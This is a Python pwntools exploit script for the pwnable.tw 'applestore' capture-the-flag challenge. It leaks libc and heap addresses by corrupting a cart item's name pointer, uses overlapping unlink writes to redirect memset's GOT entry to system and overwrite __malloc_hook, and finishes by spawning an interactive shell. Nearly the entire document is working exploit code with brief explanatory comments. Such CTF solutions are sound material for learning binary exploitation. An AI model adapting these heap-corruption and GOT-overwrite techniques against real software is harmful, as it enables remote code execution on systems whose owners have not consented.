from pwn import *

e = ELF("./applestore")
libc = ELF("./libc_32.so.6")

if "--remote" in sys.argv:
  p = remote("chall.pwnable.tw", 10104)
else:
  p = process(["./ld-linux-32.so", e.path], env={"LD_PRELOAD": libc.path})

def alloc(idx):
  p.sendlineafter(">", "2")
  p.sendlineafter(">", str(idx))

def free(idx):
  p.clean()

def show(opt):
  p.sendlineafter(">", str(opt))
  p.sendlineafter(">", "y")

for i in range(20):
  alloc(2)
for i in range(6):
  alloc(1)

# Get our special chunk on the stack!
show(5)

# Leak libc by overwriting curr->name with GOT entry
p.sendlineafter(">", "4")
p.sendlineafter(">", "y" * 2 + p32(e.got["malloc"]) + p32(0) * 3)

p.recvuntil("27: ")
libc_base = u32(p.recvline()[:4]) - libc.symbols["malloc"]
print("Libc Base: {:#x}".format(libc_base))

# Leak heap by overwriting curr->name with myCart->fd
p.sendlineafter(">", "4")
p.sendlineafter(">", "y" * 2 + p32(e.symbols["myCart"] + 0x8) + p32(0) * 3)

p.recvuntil("27: ")
heap_base = u32(p.recvline()[:4]) - 0x410
print("Heap Base: {:#x}".format(heap_base))

# Remove extraneous chunks
for i in range(26):
  p.sendlineafter(">", "3")
  p.sendlineafter(">", "1")

"""
Because we can only write writable addresses to writable addresses in unlink, we need a place where we can write random stuff without fear of any concequences. I chose heap_base + 0x1000 but any place should work really. 
""" 
writable_addr = heap_base + 0x1000

# Use 4 overlapping writes to write an arbitrary address to a location. Note this corrupts *(addr + 0x4)
def write(addr, val):
  print("Writing {:#x}".format(u32(val)))
  for i in range(4):
    p.sendlineafter(">", "3")
    p.sendlineafter(">", "1\x00" + p32(e.symbols["malloc"]) + p32(0) + p32(writable_addr + ord(val[i])) + p32(addr + i - 0x8))

"""
The got entry after memset is asprintf, which we can corrupt. 

Note that memset(&myCart, 0, 0x10) is called in main. We want to call system("sh")
"""
write(e.got["memset"], p32(libc_base + libc.symbols["system"]))
# Change &myCart to "sh"
write(e.symbols["myCart"], "sh".ljust(4, "\x00"))
# Return to main on call of malloc
write(libc_base + libc.symbols["__malloc_hook"], p32(e.symbols["main"]))

# Malloc
p.sendlineafter(">", "2")
p.sendlineafter(">", "1")

p.interactive()
